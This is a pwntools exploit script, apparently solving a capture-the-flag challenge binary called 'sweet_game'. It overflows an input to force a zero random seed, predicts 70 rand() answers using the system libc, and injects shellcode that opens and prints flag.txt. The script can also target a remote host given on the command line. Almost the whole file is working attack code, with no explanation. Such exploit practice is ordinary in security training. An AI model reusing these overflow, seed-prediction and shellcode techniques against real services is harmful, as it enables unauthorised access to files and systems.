#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from ctypes import CDLL
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('sweet_game')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
breakrva 0x1660
breakrva 0x15B2
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
    code = "uyscuti"
    io.sendlineafter(b"system:", b"A"*0xa + p32(0x0))
    io.sendlineafter(b"proceed:", code.encode())
    libc.srand(0)

    for i in range(70):
        valid = (libc.rand() + 8) % 20 + 1
        io.sendlineafter(b"1 to 20:", str(valid).encode())


    shellcode = shellcraft.linux.openat(-100, "flag.txt")
    shellcode += shellcraft.linux.sendfile(1, 'rax', 0, 500)
    
    io.sendline(asm(shellcode))

    io.interactive()


def main():
    
    init()
    solve()


if __name__ == '__main__':
    main()

